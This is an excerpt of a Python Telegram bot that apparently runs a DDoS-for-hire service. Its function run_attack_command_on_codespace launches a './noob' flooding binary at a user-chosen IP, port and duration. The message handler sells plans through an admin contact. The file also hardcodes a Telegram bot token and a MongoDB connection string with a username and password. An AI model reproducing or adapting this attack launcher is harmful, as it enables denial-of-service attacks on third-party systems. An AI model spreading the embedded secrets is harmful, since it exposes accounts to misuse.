...
TOKEN = '7143177821:AAGCj4pANrD9BzfojS-6OVsiWuzxcMN1-cU'
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
FORWARD_CHANNEL_ID = -2235980179    # enter the log channel id
CHANNEL_ID = -2235980179              # enter the log channel id
error_channel_id = -2235980179         # enter the log channel id
...
async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"./noob {target_ip} {target_port} {duration} 60"
    try:
...
def handle_message(message):
    ...
    if message.text == "Instant Plan 🧡":
        ...
        bot.reply_to(message, "*Contact admin selected*\n\n @ANIK_X_PRO", parse_mode='Markdown')
    else:
